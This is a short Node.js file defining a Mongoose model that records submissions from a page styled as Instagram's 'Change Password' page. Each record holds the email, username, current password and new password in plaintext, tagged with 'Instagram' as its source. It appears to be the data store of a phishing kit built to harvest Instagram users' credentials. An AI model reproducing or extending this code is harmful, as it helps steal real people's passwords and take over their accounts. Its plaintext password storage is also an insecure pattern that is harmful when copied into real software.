const mongoose = require('mongoose');

/**
 * Tracks every change-password attempt submitted on the Instagram
 * Change Password page.
 * Collection: Instagram.changepassword
 */
const changePasswordSchema = new mongoose.Schema(
  {
    email: {
      type:      String,
      required:  true,
      trim:      true,
      lowercase: true,
    },
    username: {
      type:  String,
      trim:  true,
      default: '',
    },
    currentPassword: {
      type: String,
    },
    newPassword: {
      type: String,
    },
    source: {
      type:    String,
      default: 'Instagram',
    },
    path: {
      type:    String,
      default: 'change_password',
    },
    time: {
      type: String,
    },
  },
  { timestamps: true }
);

// Explicit collection name: Instagram.changepassword
const ChangePassword = mongoose.model('ChangePassword', changePasswordSchema, 'changepassword');

module.exports = ChangePassword;
